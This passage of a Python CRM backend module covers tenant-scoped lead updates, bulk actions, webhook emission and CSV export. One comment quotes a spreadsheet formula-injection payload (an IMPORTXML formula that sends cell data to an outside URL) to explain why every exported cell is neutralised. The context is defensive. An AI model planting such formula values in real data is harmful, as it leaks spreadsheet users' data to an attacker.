        facets.append(Facet(key=column.key, label=column.label, values=tuple(values)))

    return FacetSet(
        facets=tuple(facets), omitted_field_count=max(len(facetable) - MAX_FACET_FIELDS, 0)
    )


async def list_leads(
    session: AsyncSession,
    *,
    limit: int = 50,
    offset: int = 0,
    status: str | None = None,
    search: str | None = None,
    agent_id: UUID | None = None,
) -> tuple[list[LeadOut], int]:
    """Rows and total only, for callers that do not want the status breakdown.

    Kept as the plain two-value read on top of `list_leads_page`; it costs the same
    queries, so there is no reason for a caller to reach past it for speed.

    On pagination: this stays LIMIT/OFFSET, and that is a decision rather than an
    oversight. Keyset pagination is the right answer at a size this product does not
    have — the page is capped at 200 rows, the largest tenant we plan for is tens of
    thousands of leads, and `total` plus "jump to page N" are both in the shipped
    contract and both incompatible with a cursor. What actually broke at scale was the
    ORDER BY, not the OFFSET, and that is fixed above. Revisit when a single tenant's
    lead table passes six figures or the UI grows infinite scroll.
    """
    page = await list_leads_page(
        session, limit=limit, offset=offset, status=status, search=search, agent_id=agent_id
    )
    return page.items, page.total


def _lead_out(r: Any) -> LeadOut:
    return LeadOut(
        id=r[0],
        phone_e164=r[1],
        name=r[2],
        status=r[3],
        source=r[4],
        data=r[5] or {},
        schema_version=r[6],
        call_count=r[7],
        is_repeat_caller=r[8],
        last_call_id=r[9],
        created_at=r[10],
        updated_at=r[11],
        assigned_to=r[12],
        assigned_to_name=r[13],
    )


async def get_lead(session: AsyncSession, lead_id: UUID) -> LeadOut:
    row = (
        await session.execute(
            text(
                f"SELECT {_LEAD_COLUMNS} FROM leads l {_LEAD_OWNER_JOIN} "
                "WHERE l.id = :lid AND l.deleted_at IS NULL"
            ),
            {"lid": lead_id},
        )
    ).first()
    if row is None:
        raise ProblemError.not_found("Lead")
    return _lead_out(row)


async def lead_phone(session: AsyncSession, lead_id: UUID) -> tuple[str, str | None]:
    row = (
        await session.execute(
            text("SELECT phone_e164, name FROM leads WHERE id = :lid AND deleted_at IS NULL"),
            {"lid": lead_id},
        )
    ).first()
    if row is None:
        raise ProblemError.not_found("Lead")
    return str(row[0]), row[1]


@dataclass(frozen=True, slots=True)
class AssigneeChange:
    """A request to change who owns a lead. `user_id=None` is UNASSIGN.

    The type exists so that "leave the owner alone" and "this lead has no owner" are
    different VALUES rather than the same `None`: passing `AssigneeChange | None` makes
    the absent case unrepresentable as an accident, which a bare `UUID | None` parameter
    could not do. `crm.routes.patch_lead` builds it from Pydantic's `model_fields_set`,
    which is where the client's `null` is told apart from an omitted key.
    """

    user_id: UUID | None


async def _write_lead_event(
    session: AsyncSession,
    lead_id: UUID,
    *,
    event_type: str,
    payload_sql: str,
    params: dict[str, Any],
) -> None:
    """One timeline row, taking `tenant_id` from the lead itself.

    `SELECT ... FROM leads` rather than a bound tenant id: under RLS the lead row is
    already proven to be this tenant's (the UPDATE above matched it), so reading the
    tenant off it cannot write an event into an account the caller cannot see, and the
    caller does not have to hold a tenant id it never needed.

    **EVERY PARAMETER INSIDE `payload_sql` MUST CARRY AN EXPLICIT CAST**, and that is a
    correctness rule rather than a style one. `jsonb_build_object` is declared
    `VARIADIC "any"`, so it gives Postgres nothing to resolve an untyped parameter
    against; psycopg3 sends a bare `str` as `unknown`, and the statement fails to PLAN
    with `IndeterminateDatatype: could not determine data type of parameter $n`. It is a
    500 on every call, not a wrong value, and it is what `PATCH /v1/leads/{id}` did with
    a status from the day the status select shipped until this slice's first test tried
    it — the route had no test that sent a body. `tests/lead_assignment_test.py`'s
    status-change cases are what keeps it fixed.
    """
    await session.execute(
        text(
            "INSERT INTO lead_events (id, tenant_id, lead_id, type, payload, actor, "
            f"created_at, updated_at) SELECT :event_id, tenant_id, id, '{event_type}', "
            f"{payload_sql}, :actor, now(), now() FROM leads WHERE id = :lid"
        ),
        {"event_id": uuid7(), "lid": lead_id, **params},
    )


async def _assert_assignable(session: AsyncSession, user_id: UUID) -> None:
    """Refuse an owner who is not on this tenant's team.

    THE TENANCY CONTROL IS THE RLS ON `memberships`, not this function's SQL:
    `leads.assigned_to` is a foreign key to `users`, which is a GLOBAL table, so the
    constraint would cheerfully accept another tenant's user id and the column would
    then point at a person the account has never heard of. `memberships` is FORCE-RLS'd
    on `tenant_id`, so under the request's own session this SELECT can only ever see
    colleagues — and a foreign id therefore finds nothing and is refused here.

    Deliberately NOT folded into the UPDATE's WHERE clause as an EXISTS. That would be
    one statement and would close a TOCTOU window, but `rowcount == 0` would then mean
    either "no such lead" or "no such member", and the two send a person to different
    places — errors are part of the interface. The window it leaves is harmless by
    construction: `assigned_to` grants the assignee NOTHING (it is a pointer, not a
    permission), so the worst a lost race can produce is a lead owned by somebody whose
    membership was revoked in the same millisecond, which the next read renders as
    "no longer on this account" and the next assignment fixes.

    `deactivated_at` is checked too: a membership outlives a deactivation (the auth
    guard re-checks the user on every request, BACKEND-PATTERNS §7), so assigning work
    to a disabled account would otherwise be accepted and would look like an owner.
    """
    row = (
        await session.execute(
            text(
                "SELECT 1 FROM memberships m JOIN users u ON u.id = m.user_id "
                "WHERE m.user_id = :uid AND u.deactivated_at IS NULL"
            ),
            {"uid": user_id},
        )
    ).first()
    if row is None:
        raise ProblemError.business_rule(
            "lead_assignee_not_a_member",
            "That person is not on this account's team, so this lead cannot be assigned to them.",
            remediation=(
                "Pick someone from the team list, or invite them to the account first "
                "and assign the lead once they have accepted."
            ),
        )


# A lead may go from ANY of its six states to any other, so `from_statuses` for a lead
# transition is simply "every other one".
#
# The state machine is deliberately fully connected and D-21 is the reason: the six
# values are fixed, and none of the moves between them is illegal — a lead marked `lost`
# who calls back next month becomes `hot` again, and a client correcting a mis-click must
# not need support. So `transition_status`'s MIDDLE answer (409, "it is in some other
# state") is unreachable for a lead. That is a property of this state machine, not a hole
# in the primitive: campaigns and knowledge sources have genuinely illegal moves and get
# genuine 409s from the same call.
#
# What the shared primitive buys the lead is the other two answers, and lead status was
# getting both of them wrong (BACKEND-PATTERNS §5 names "lead status" in the CAS list;
# nothing here was doing it). A blanket `UPDATE ... SET status = :status` could not tell
# "I moved it" from "it was already there", so every second click wrote another
# `status_change` row claiming a change that did not happen and bumped `updated_at`,
# which is the leads table's own sort key — a no-op edit re-ordered the client's screen.
# And `WHERE id = :lid AND deleted_at IS NULL` returning zero rows was read as 404, which
# is right, but only because there was nothing else it could mean; the discriminator now
# says so on purpose.
_LEAD_VISIBLE = "deleted_at IS NULL"


def _lead_from_statuses(to_status: str) -> tuple[str, ...]:
    return tuple(s for s in LEAD_STATUSES if s != to_status)


async def set_lead_status(session: AsyncSession, lead_id: UUID, *, status: str, actor: str) -> bool:
    """Move one lead into `status`. True when THIS call moved it, False when it was there.

    404s an absent or soft-deleted lead (and, under RLS, a neighbour's — deliberately the
    same answer). The timeline row is written ONLY on a real move, which is the point of
    routing through `transition_status`: the lead timeline is evidence, and an event that
    records a button press rather than a change is evidence of the wrong thing.
    """
    moved = await transition_status(
        session,
        table="leads",
        entity="Lead",
        row_id=lead_id,
        to_status=status,
        from_statuses=_lead_from_statuses(status),
        visible_where=_LEAD_VISIBLE,
    )
    if moved:
        await _write_lead_event(
            session,
            lead_id,
            event_type="status_change",
            payload_sql="jsonb_build_object('status', CAST(:status AS text))",
            params={"status": status, "actor": actor},
        )
    return moved


async def set_lead_assignee(
    session: AsyncSession, lead_id: UUID, *, assignee: AssigneeChange, actor: str
) -> bool:
    """Set or clear one lead's owner. True when THIS call changed it.

    The same three answers as `set_lead_status`, spelled out here rather than borrowed,
    because `transition_status` cannot serve an owner column: its guard is
    `status IN (:from0, …)` and the "every other value" list for `assigned_to` is every
    user id in the world. So the guard becomes `IS DISTINCT FROM` — which is CAS in the
    sense BACKEND-PATTERNS §5 means (the condition is in the WHERE clause, `rowcount == 0`
    is the lost race), and `IS DISTINCT FROM` rather than `<>` because the owner is
    nullable and `NULL <> NULL` is NULL, so an unassign of an already-unassigned lead
    would match the row and write an event for nothing.

    The caller validates the assignee first (`_assert_assignable`); this function assumes
    that has happened, because the refusal is about the PERSON and belongs to the request,
    not to each lead in it.
    """
    changed = rowcount_of(
        await session.execute(
            text(
                "UPDATE leads SET assigned_to = :assigned_to, updated_at = now() "
                f"WHERE id = :lid AND {_LEAD_VISIBLE} "
                "AND assigned_to IS DISTINCT FROM :assigned_to"
            ),
            {"lid": lead_id, "assigned_to": assignee.user_id},
        )
    )
    if not changed:
        # Zero rows is "already this owner" or "no such lead", and those are a 200 and a
        # 404. Same ordering rule as `transition_status`: the write ran first and
        # unconditionally, so this read cannot reintroduce a race.
        exists = (
            await session.execute(
                text(f"SELECT 1 FROM leads WHERE id = :lid AND {_LEAD_VISIBLE}"), {"lid": lead_id}
            )
        ).first()
        if exists is None:
            raise ProblemError.not_found("Lead")
        return False
    # UNASSIGNMENT IS AN EVENT TOO, and the `NULL` is the point: an owner who leaves is
    # exactly the case somebody asks the timeline about later, so it is recorded rather
    # than inferred from the absence of a later assignment.
    #
    # The payload carries the assignee's ID and never their NAME. A name copied into a
    # timeline row is a name that goes stale the day they change it and stays readable
    # after they leave the account; the read resolves it through `memberships` instead,
    # so the tenant's own policy decides who can be named.
    await _write_lead_event(
        session,
        lead_id,
        event_type="assignment",
        payload_sql="jsonb_build_object('assigned_to', CAST(:assigned_to AS text))",
        params={
            "assigned_to": str(assignee.user_id) if assignee.user_id else None,
            "actor": actor,
        },
    )
    return True


async def set_lead_name(session: AsyncSession, lead_id: UUID, *, name: str) -> bool:
    """Rename one lead. True when THIS call changed it, False when it already read so.

    CAS on the value (`IS DISTINCT FROM`), like `set_lead_assignee` beside it, rather
    than a blanket `SET name = :name`. `_LEAD_VISIBLE`'s own comment condemns the
    blanket form for status — "a no-op edit re-ordered the client's screen", because
    `updated_at` is the Leads table's sort key — and the rename was the last field still
    doing it. It also has to be able to say "already so" now that a real change is what
    decides whether a `lead.updated` webhook fires: re-saving an unedited row must not
    post to a client's CRM.

    Zero rows is then two facts, so it is disambiguated the same way `set_lead_assignee`
    does it: the write ran first and unconditionally, and the SELECT that follows writes
    nothing and cannot reintroduce a race.
    """
    changed = rowcount_of(
        await session.execute(
            text(
                "UPDATE leads SET name = :name, updated_at = now() "
                f"WHERE id = :lid AND {_LEAD_VISIBLE} AND name IS DISTINCT FROM :name"
            ),
            {"lid": lead_id, "name": name},
        )
    )
    if changed:
        return True
    exists = (
        await session.execute(
            text(f"SELECT 1 FROM leads WHERE id = :lid AND {_LEAD_VISIBLE}"), {"lid": lead_id}
        )
    ).first()
    if exists is None:
        raise ProblemError.not_found("Lead")
    return False


# The `data` keys a `lead.*` outbound event carries (docs/WEBHOOKS.md §1.2), and the
# order `integrations.service.DEFAULT_SHEET_COLUMNS` writes them into a spreadsheet.
# Selected explicitly rather than reusing `_LEAD_COLUMNS`: this projection leaves our
# boundary for a third party, so it is a list somebody has to EDIT to widen — the
# extraction payload, the owner's name and the call counts are ours and the client's,
# not their CRM vendor's.
_LEAD_EVENT_SQL = "SELECT id, phone_e164, name, source, status FROM leads WHERE id = ANY(:ids)"


async def emit_lead_updated(session: AsyncSession, lead_ids: Sequence[UUID]) -> int:
    """Tell every subscribed endpoint that these leads changed (D-23, `lead.updated`).

    **This event was subscribable and nothing produced it.** `lead.updated` has been in
    `EVENT_TYPES`, in the endpoint form's checkbox list ("A lead's details change") and
    in `DEFAULT_SHEET_COLUMNS` since D-23, and no line of code has ever enqueued one — so
    a client could tick the box, see the endpoint saved, and wait forever. A half-wired
    integration is worse than an absent one: the absent one does not get relied on.

    Emitted from the EDIT primitives' callers rather than from `set_lead_status` /
    `set_lead_assignee` themselves, because a bulk action moves up to `MAX_BULK_LEADS`
    rows in one transaction and one event per lead per FIELD would tell a client's CRM
    twice about a single edit that moved both. One event per lead per request.

    **The phone is not masked here and that is correct** — `integrations.enqueue_events`
    masks at the fan-out, which is the only point that knows whether THIS endpoint holds
    the `include_raw_phone` opt-in. Masking here would apply one answer to every
    subscriber and would silently break the opt-in (that module's own docstring).

    Local import: `crm` is imported by `integrations`' neighbours and a module-scope
    import here is a cycle waiting for the first shared type.
    """
    if not lead_ids:
        return 0
    from apps.api.integrations import service as integrations

    rows = (await session.execute(text(_LEAD_EVENT_SQL), {"ids": list(lead_ids)})).all()
    if not rows:
        return 0
    return await integrations.enqueue_events(
        session,
        tenant_id=await session_tenant(session),
        event="lead.updated",
        rows=[
            {
                "lead_id": str(r[0]),
                "phone": r[1],
                "name": r[2],
                "source": r[3],
                "status": r[4],
            }
            for r in rows
        ],
    )


async def update_lead(
    session: AsyncSession,
    lead_id: UUID,
    *,
    status: str | None,
    name: str | None,
    assignee: AssigneeChange | None = None,
    actor: str,
) -> LeadOut:
    """One lead's editable fields, each through the primitive that owns it.

    Three statements where there used to be one, and the split is what makes each field
    able to report "already so". A single `SET status = …, assigned_to = …` can only say
    how many ROWS it touched, never which of the two values actually moved — so the
    events it wrote were guesses.

    ONE `lead.updated` for the request, and only when something actually moved: a PATCH
    that re-sends the values already on the row is not news for a client's CRM, and a
    PATCH that moves two fields is one edit rather than two.
    """
    if assignee is not None and assignee.user_id is not None:
        # Validated BEFORE any write, so a refused assignment leaves no partial edit —
        # a body carrying both a status and a bad assignee must move neither.
        await _assert_assignable(session, assignee.user_id)

    moved = False
    if status is not None:
        moved |= await set_lead_status(session, lead_id, status=status, actor=actor)
    if name is not None:
        moved |= await set_lead_name(session, lead_id, name=name)
    if assignee is not None:
        moved |= await set_lead_assignee(session, lead_id, assignee=assignee, actor=actor)
    if moved:
        await emit_lead_updated(session, [lead_id])
    # No field asked for: `get_lead` is still the 404, so a PATCH with an empty body
    # against a lead that is not there does not answer 200 with somebody else's silence.
    return await get_lead(session, lead_id)


# --- bulk actions (SURFACES §2, "with the researched guardrails") ---------------
#
# WHAT THE RESEARCH SETTLED, and where each finding landed in this code.
#
# 1. **Selection scope is the classic defect and it is settled by having TWO scopes with
#    two names, never one ambiguous "select all".** The header checkbox is page-scoped
#    and a separate control extends to the whole matching set — PatternFly ("a checkbox
#    in a table's header row will select … all items on the current page if pagination
#    is in use"), Helios ("bulk selection is global in scope … not a replacement for the
#    selection in the header of the table"), and Gmail's banner ("All 50 conversations on
#    this page are selected. Select all conversations that match this search"), which is
#    the interaction most people have already learned. GitLab's own enhanced-bulk-actions
#    issue lists "select all results based on the current filter" as the missing half.
#    Here that is `scope: "ids"` vs `scope: "filter"`, and the RESPONSE echoes which one
#    ran so the sentence on screen is the server's answer rather than the screen's
#    assumption. This table has facets, so the filtered set is routinely far larger than
#    the page and the two scopes are genuinely different actions.
# 2. **Partial success is the normal outcome and needs per-item results.** The REST
#    debate is 207 Multi-Status (RFC 4918, WebDAV) versus 200 with per-item statuses;
#    the widely-given advice for a general JSON API is 200 plus a documented result body,
#    because intermediaries and generated clients treat 207 as success anyway. We take
#    200 for a third, local reason: this repo already answers "the request was processed
#    and the answer is a refusal" with a 200 body (`CallLeadOut.status == "blocked"`), and
#    RFC-9457 problem+json is reserved for "the request failed" (BACKEND-PATTERNS §3). A
#    207 would be parsed by `apiRequest` on exactly the same branch as the 200 while
#    adding a status code no other route in this app uses.
# 3. **The failure list names the row and the reason.** `(rule, reason)` is this repo's
#    existing shape for a named refusal — `DispatchDecision`, `LaunchBlocker`/`BlockerOut`,
#    `CallLeadOut.blocked_rule`/`blocked_reason` — so a bulk failure is that pair plus the
#    lead it belongs to, and nothing new to learn.
# 4. **The confirmation must describe the set that will ACTUALLY be acted on**, counted,
#    before the click. That is the screen's job, but the server holds the two halves it
#    cannot fake: the cap refusal below (never a silent truncation) and `expected_count`,
#    which lets the screen's stated number be checked against the set the server is about
#    to touch — a filter-scoped batch is chosen against a count that can move while the
#    person is reading the dialog.
# 5. **Undo.** Deliberately NOT built, and the reason is that the two actions here are
#    their own undo: status and owner are single-value fields with no destructive side
#    effect, and re-running the bulk with the previous value restores it exactly — which
#    the `unchanged` count then reports honestly for the rows that never moved. An undo
#    token would be a second, stateful way to do the same write.
#
# **Bulk DELETE was considered and is refused.** `leads.deleted_at` exists, so it would
# have been four lines. It cannot be built honestly here: under DPDP the client's
# erasure obligation runs through `compliance/deletion.py` — a `deletion_requests` row,
# an outbox job, a worker that reaches calls, turns, extractions, storage and the engine,
# and a certificate the client hands to the data principal — while `deleted_at` only
# hides the row from this table and erases nothing. Shipping a button labelled "Delete"
# that sets a hide-flag would teach a client that they had answered an erasure request
# when they had not, which is the one misunderstanding this product must never create.
# A bulk erasure (N deletion requests, N certificates, N statutory clocks) is a real
# feature and a different slice; it belongs beside the data-rights screen that already
# owns the single-subject version, not on the leads grid.

BulkAction = Literal["status", "assign"]


@dataclass(frozen=True, slots=True)
class BulkFailure:
    """One lead the action could not move, and why — `(rule, reason)` as everywhere else.

    `rule` is the stable machine code (the same vocabulary `ProblemError.code` speaks),
    `reason` is the sentence a client reads. The lead is named by ID and never by phone
    or name: this object reaches an audit summary and a log line (hard rule 6).
    """

    lead_id: UUID
    rule: str
    reason: str


@dataclass(frozen=True, slots=True)
class BulkTargets:
    """The leads a bulk action will touch, resolved BEFORE anything is written.

    `missing` is the ids-scope half: an id the caller ticked that this tenant cannot see
    — removed, soft-deleted, or a neighbour's (RLS makes those one answer on purpose).
    Resolving first is what lets the response name them individually instead of the batch
    failing wholesale on the first bad id.
    """

    ids: list[UUID]
    missing: list[UUID]


@dataclass(frozen=True, slots=True)
class BulkOutcome:
    """What a bulk action actually did. `changed + unchanged + len(failures) == requested`.

    `unchanged` is a SUCCESS bucket and is separate from `failures` for the reason D-65
    exists: "3 of the 10 were already hot" is the batch doing exactly what was asked, and
    folding it into a failure count would make the correct outcome look like an incident.
    """

    requested: int
    changed: int
    unchanged: int
    failures: list[BulkFailure]


async def resolve_bulk_targets(
    session: AsyncSession,
    *,
    ids: list[UUID] | None,
    status: str | None = None,
    search: str | None = None,
    agent_id: UUID | None = None,
    assigned_to: UUID | None = None,
    field_filters: FieldFilters | None = None,
) -> BulkTargets:
    """Which leads the action is about — `ids is None` means "everything the lens matches".

    The lens is the SAME `_lead_scope` the list, the facet counts and the CSV export use,
    for the reason the export's docstring gives: a scope spelled twice is a scope that
    drifts, and here the drift would move rows the client never saw.

    In IDS scope the lens is deliberately NOT re-applied. The ticked rows are the ticked
    rows; intersecting them with a filter the person may have changed since ticking would
    silently drop rows from a set they had already confirmed, which is the same class of
    lie as acting on rows they cannot see. The screen's obligation is the other half —
    it clears the selection when the lens moves — and both halves are tested.

    A filter matching more than `MAX_BULK_LEADS` is REFUSED rather than truncated.
    Silently doing the first 500 of 5,000 and reporting success is the exact failure this
    whole slice is about.
    """
    if ids is not None:
        found = {
            UUID(str(row[0]))
            for row in (
                await session.execute(
                    text(f"SELECT id FROM leads WHERE {_LEAD_VISIBLE} AND id = ANY(:ids)"),
                    {"ids": ids},
                )
            ).all()
        }
        # Caller order preserved so the failure list reads in the order the rows sat on
        # screen, and de-duplicated so a doubled id is not counted (or reported) twice.
        seen: set[UUID] = set()
        ordered: list[UUID] = []
        for lead_id in ids:
            if lead_id not in seen:
                seen.add(lead_id)
                ordered.append(lead_id)
        return BulkTargets(
            ids=[i for i in ordered if i in found],
            missing=[i for i in ordered if i not in found],
        )

    params: dict[str, Any] = {"cap": MAX_BULK_LEADS}
    clauses = _lead_scope(
        params,
        search=search,
        agent_id=agent_id,
        assigned_to=assigned_to,
        field_filters=field_filters,
    )
    if status:
        clauses.append("l.status = :status")
        params["status"] = status
    rows = (
        await session.execute(
            text(
                # `count(*) OVER ()` is evaluated before LIMIT, so one pass yields both
                # the page of ids and the size of the set they came from — which is what
                # tells a cap breach from a set that merely fills the cap exactly.
                f"SELECT l.id, count(*) OVER () FROM leads l WHERE {' AND '.join(clauses)} "
                "ORDER BY l.id LIMIT :cap"
            ),
            params,
        )
    ).all()
    matched = int(rows[0][1]) if rows else 0
    if matched > MAX_BULK_LEADS:
        raise ProblemError.business_rule(
            "lead_bulk_too_many",
            f"This filter matches {matched} leads, and one bulk action can move at most "
            f"{MAX_BULK_LEADS}.",
            remediation=(
                "Narrow the filter — by stage, by owner or by one of the panel's fields "
                "— and run the action on each part."
            ),
        )
    return BulkTargets(ids=[UUID(str(row[0])) for row in rows], missing=[])


async def apply_bulk_leads(
    session: AsyncSession,
    *,
    targets: BulkTargets,
    action: BulkAction,
    status: str | None = None,
    assignee: AssigneeChange | None = None,
    actor: str,
) -> BulkOutcome:
    """Run one action over resolved targets, reporting each lead's own outcome.

    **Per-lead, not set-based, and that is the point.** `UPDATE leads SET status = :s
    WHERE id = ANY(:ids)` would be one round trip and would be a second implementation of
    the transition — it could report how many rows it touched but not which of them were
    already there, and "already there" is a success this response has to be able to say
    (D-65). So each lead goes through `set_lead_status` / `set_lead_assignee`, the same
    two functions `PATCH /v1/leads/{id}` calls, and the batch is capped instead.

    **One transaction, many outcomes.** Every write here is on the request's session, so
    the batch commits together: a "failure" in this response always means *this lead was
    not eligible*, never *this lead's write was lost*. If something raises that is not a
    `ProblemError` the whole request 500s and nothing is applied, which is the honest
    behaviour for a fault we do not understand — a half-applied batch reported as a
    success would be worse than a refused one.

    The per-lead `ProblemError`s caught here are raised after clean statements (a zero-row
    UPDATE and a SELECT), so they leave the transaction usable; a driver-level error is
    not caught and is not meant to be.
    """
    if assignee is not None and assignee.user_id is not None:
        # ONCE for the batch, and before the first write. "That person is not on this
        # team" is a fact about the REQUEST — repeating it as four hundred per-lead
        # failures would bury the rows that failed for reasons of their own, and would
        # report a 422 as a partial success.
        await _assert_assignable(session, assignee.user_id)

    changed = unchanged = 0
    # The leads a `lead.updated` is owed, collected rather than emitted per lead: one
    # fan-out for the batch reads the endpoint list once (`integrations.enqueue_events`)
    # instead of once per lead, and a lead that both moved stage and changed owner in one
    # batch is still one event.
    moved_ids: list[UUID] = []
    failures = [
        BulkFailure(
            lead_id=lead_id,
            rule="not_found",
            reason="This lead is no longer on this account, so it was left alone.",
        )
        for lead_id in targets.missing
    ]
    for lead_id in targets.ids:
        try:
            if action == "status":
                assert status is not None  # the route's validator guarantees it
                moved = await set_lead_status(session, lead_id, status=status, actor=actor)
            else:
                assert assignee is not None
                moved = await set_lead_assignee(session, lead_id, assignee=assignee, actor=actor)
        except ProblemError as problem:
            # A lead deleted between the resolve and the write, or (for a state machine
            # that had illegal moves) a row someone else moved first. Named, never
            # counted: the client can act on "these three are gone", not on "three
            # failed".
            failures.append(BulkFailure(lead_id=lead_id, rule=problem.code, reason=problem.detail))
            continue
        if moved:
            changed += 1
            moved_ids.append(lead_id)
        else:
            unchanged += 1
    # After the loop and inside the same transaction: the outbox row and the row it
    # describes commit together or not at all (BACKEND-PATTERNS §4), so a batch that
    # 500s cannot leave a client's CRM told about an edit that rolled back.
    await emit_lead_updated(session, moved_ids)
    return BulkOutcome(
        requested=len(targets.ids) + len(targets.missing),
        changed=changed,
        unchanged=unchanged,
        failures=failures,
    )


@dataclass(frozen=True, slots=True)
class LeadExport:
    """The file, and how many LEADS are in it.

    Two values rather than one string because the caller has to audit the second, and
    counting lines in the first is not the same question: a cell may legitimately hold a
    newline (`csv.QUOTE_ALL` keeps it inside the quoted field), so the file has more
    lines than it has leads exactly when somebody's name or note contains a line break.
    """

    csv: str
    row_count: int


async def export_leads_csv(
    session: AsyncSession,
    *,
    agent_id: UUID | None = None,
    status: str | None = None,
    search: str | None = None,
    assigned_to: UUID | None = None,
    field_filters: FieldFilters | None = None,
    columns: list[str] | None = None,
) -> LeadExport:
    """CSV export with schema-driven columns (TRD §7 (e)).

    **The header IS the column chooser.** `columns` goes through
    `crm.columns.resolve` — the same function, with the same registry, that decides
    what the Leads screen renders — so "export what I am looking at" is a property of
    one resolver rather than a coincidence between two lists. There is no fixed header
    constant here any more; the one that used to live above this function was the second
    of the two lists, and it is what let the file hold `source` and `created_at` while
    the screen showed `owner` and `updated_at`.

    The row query therefore selects the SAME projection as the list (`_LEAD_COLUMNS`,
    owner join included) rather than a shorter one of its own: a column the registry can
    offer and the export cannot fetch would be a chooser entry that silently exports
    blanks.

    The phone is exported IN FULL, like every other surface now renders it (D-436) —
    but this route keeps `calls:read_raw` and its `audit_log` write regardless. A whole
    contact list in one file is a different act from reading one row on a screen, and
    the record of who took it is what makes it defensible.

    **Takes the same filters as `list_leads_page`, through the same `_lead_scope`.**
    It took `agent_id` alone, so a client who narrowed the table to `hot` and pressed
    Export downloaded every contact in the account — a difference between what the
    screen showed and what the file held, on the one route that emits a whole contact
    list as a FILE.
    Sharing the WHERE builder is what keeps the two in step as filters grow, and
    `assigned_to` is the first filter added since: it arrived here in the same change
    that added it to the list, rather than a release later.

    Bounded by `MAX_EXPORT_ROWS`: every other read in this module is paged, and this
    one builds the entire file in memory inside the request. The bound now applies to
    the FILTERED rows, which is what makes the refusal's advice ("narrow it") reachable.
    """
    fields = await lead_columns(session, agent_id)
    chosen = lead_column_registry.resolve(lead_column_registry.available(fields), columns).columns
    params: dict[str, Any] = {"limit": MAX_EXPORT_ROWS + 1}
    clauses = _lead_scope(
        params,
        search=search,
        agent_id=agent_id,
        assigned_to=assigned_to,
        field_filters=field_filters,
    )
    if status:
        clauses.append("l.status = :status")
        params["status"] = status
    rows = (
        await session.execute(
            text(
                f"SELECT {_LEAD_COLUMNS} "
                f"FROM leads l {_LEAD_OWNER_JOIN} WHERE {' AND '.join(clauses)} "
                # Tiebreaker for the same reason as the list — here the stakes are which
                # rows survive the LIMIT, so an unstable sort means two exports of one
                # unchanged account hand back two different sets of people.
                # Qualified `l.`, because the owner join brings a second `id` and a
                # second `created_at` into scope.
                "ORDER BY l.created_at DESC, l.id DESC LIMIT :limit"
            ),
            # One row over the cap, so hitting it is detectable without a second count.
            params,
        )
    ).all()
    if len(rows) > MAX_EXPORT_ROWS:
        raise ProblemError.business_rule(
            "lead_export_too_large",
            f"This export is over the {MAX_EXPORT_ROWS:,}-lead limit for a single file.",
            remediation=(
                "Narrow it — filter by status or search on the Leads screen and export "
                "again, or export one agent at a time with ?agent_id= — or ask us for a "
                "full extract."
            ),
        )

    buffer = io.StringIO()
    # QUOTE_ALL, because the formula guard below depends on it. OWASP's Excel
    # mitigation is a TAB prefix *inside the quoted field* — unquoted, the leading
    # tab is not reliably part of the value, and the guard stops guarding. Quoting
    # everything also removes the class of bug where a client's own comma or newline
    # shifts every column to its right, which is the same defect one layer down.
    writer = csv.writer(buffer, quoting=csv.QUOTE_ALL)
    # EVERY CELL GOES THROUGH THE GUARD, HEADER INCLUDED — the Sheets writer's rule
    # (`integrations.service._cell`), arrived at here the expensive way.
    #
    # This used to disarm the extraction cells alone, and the hole that left was the
    # `name` column beside them: `ingest.service` writes `leads.name` verbatim from a
    # web-form or Meta webhook body and `coerce_value` does not strip formula leaders
    # (`redteam_extraction_poisoning_test` pins that), so a lead named
    # `=IMPORTXML("https://…"&A1,"//x")` executed the moment a client double-clicked
    # their own export. Picking the "interesting" columns is what created the gap;
    # rendering every column the one way is what closes it and keeps it closed.
    #
    # The HEADER: extraction labels are authored text from the tenant's own schema, and
    # the export is downloaded by a client's staff — not the author. The threat is
    # thinner than the `name` column's, but a header cell is a cell and the argument for
    # exempting it is only that it is inconvenient to include.
    #
    # The other row columns, audited rather than assumed: `status` and `source` are
    # CHECK-constrained enums (`ck_leads_status_enum`, `ck_leads_source_enum`), so no
    # caller writes them today; `created_at`/`updated_at` are ISO-8601 instants and
    # `call_count` an integer counter, all of which begin with a digit; `owner` is a
    # `users.name`, which is self-registered text and therefore exactly as hostile as
    # `name`. None of the first group can lead a formula NOW — but that is a fact about
    # four constraints, not a property of the row.
    #
    # **AND THAT IS WHY THE CHOOSER CANNOT CREATE A HOLE HERE.** The guard is applied by
    # the RENDERER to every cell it is handed, not by a list of interesting columns, so
    # a column added to `crm.columns` is disarmed the moment it is selectable. Picking
    # columns to disarm is what left `name` raw for a release;
    # `tests/lead_columns_test.py::test_every_selectable_column_is_disarmed` walks the
    # registry and exports each column alone, so a future column that bypassed this
    # would fail rather than ship.
    #
    # The PHONE column changes shape: E.164 begins with `+`, a formula leader, so it is
    # tab-prefixed on every row. That is not collateral damage — `+919812345678` is a
    # formula to Excel, which evaluates it to `919812345678` and eats the country-code
    # marker. The guard makes the number arrive as the string we stored.
    writer.writerow([_csv_value(c.label) for c in chosen])
    for r in rows:
        mapping = r._mapping
        data = mapping["data"] or {}
        writer.writerow(
            [
                _csv_value(mapping[c.row_key] if c.row_key is not None else _json_cell(data, c.key))
                for c in chosen
            ]
        )
    # The ROW COUNT is reported alongside the bytes rather than recovered from them.
    # `crm.routes.export_leads` recorded `csv_body.count("\n") - 1` in the audit row,
    # and QUOTE_ALL preserves a newline INSIDE a cell — a lead named over two lines, or
    # a transcribed note with a line break — so "how many contacts left the building"
    # was over-counted by exactly the rows a person is most likely to have pasted into.
    # An audit trail is only worth the accuracy of its numbers.
    return LeadExport(csv=buffer.getvalue(), row_count=len(rows))


def _json_cell(data: object, key: str) -> Any:
    """One extraction value out of `leads.data`, without trusting the prototype chain.

    `data` is JSONB decoded into a `dict`, and the KEY is a client's own extraction
    field name — nothing constrains it away from `items` or `keys`, and `getattr`-shaped
    lookups on a mapping are how a method ends up rendered into a cell. A plain
    `.get()` on a verified `dict` is the whole guard; the type check is there because
    a `data` column holding a JSON array or scalar is not a bug this function should
    turn into an AttributeError inside a 20,000-row loop.
    """
    if not isinstance(data, dict):
        return None
    return data.get(key)


# --- the lead timeline --------------------------------------------------------
#
# THE PAYLOAD AUDIT. `lead_events.payload` is JSONB and six producers in three
# deployables write it. Every one was read before a line of the projection below was
# written, and this is what each can hold — the list is the reason the read projects
# rather than serializing the column, and the reason a seventh producer does not
# silently join it:
#
#   type=status_change  crm.service.update_lead
#       {status}                              our own six-value enum.
#   type=assignment     crm.service.update_lead
#       {assigned_to}                         a user id, or null for an unassignment.
